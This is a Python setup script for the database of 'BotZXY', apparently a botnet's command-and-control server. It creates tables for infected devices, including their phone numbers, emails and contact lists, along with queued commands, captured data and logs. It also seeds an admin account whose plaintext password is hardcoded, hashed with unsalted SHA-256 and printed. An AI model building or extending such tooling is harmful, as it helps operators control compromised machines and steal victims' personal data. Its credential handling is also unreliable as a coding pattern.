import sqlite3
import hashlib
import os

DB_PATH = 'database/botzxy_c2.db'

def init_db():
    """Crea tutte le tabelle del database"""
    os.makedirs('database', exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Tabella utenti
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            api_key TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabella dispositivi
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            user_id INTEGER REFERENCES users(id),
            platform TEXT,
            hostname TEXT,
            ip TEXT,
            country TEXT,
            os_version TEXT,
            is_online BOOLEAN DEFAULT 1,
            last_seen TIMESTAMP,
            registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            phone_number TEXT,
            email TEXT,
            contacts TEXT,
            bot_name TEXT DEFAULT 'BotZXY'
        )
    ''')
    
    # Tabella comandi
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT REFERENCES devices(device_id),
            command TEXT NOT NULL,
            params TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            executed_at TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabella captures
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT REFERENCES devices(device_id),
            type TEXT,
            data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Tabella logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            action TEXT,
            details TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
    print('[+] Tabelle create con successo')

def create_admin():
    """Crea l'utente admin con le credenziali personalizzate"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Elimina vecchi admin se esistono
    cursor.execute("DELETE FROM users WHERE username = 'admin'")
    cursor.execute("DELETE FROM users WHERE username = 'BotZXY-Admin'")
    
    # Credenziali personalizzate
    username = 'BotZXY-Admin'
    password = '35£t}nSBzoA%M#4T\e<'
    
    # Crea nuovo admin
    api_key = hashlib.sha256(os.urandom(32)).hexdigest()
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    cursor.execute(
        "INSERT INTO users (username, password_hash, api_key) VALUES (?, ?, ?)",
        (username, password_hash, api_key)
    )
    
    conn.commit()
    conn.close()
    
    print(f'[+] Admin creato: {username}')
    print(f'[+] Password: {password}')
    print(f'[+] API Key: {api_key[:16]}...')

if __name__ == '__main__':
    print('='*50)
    print('  SETUP BOTZXY DATABASE')
    print('='*50)
    init_db()
    create_admin()
    print('\n✅ Setup completato con successo!')
    print('📌 Username: BotZXY-Admin')
    print('📌 Password: 35£t}nSBzoA%M#4T\e<')
    print('='*50)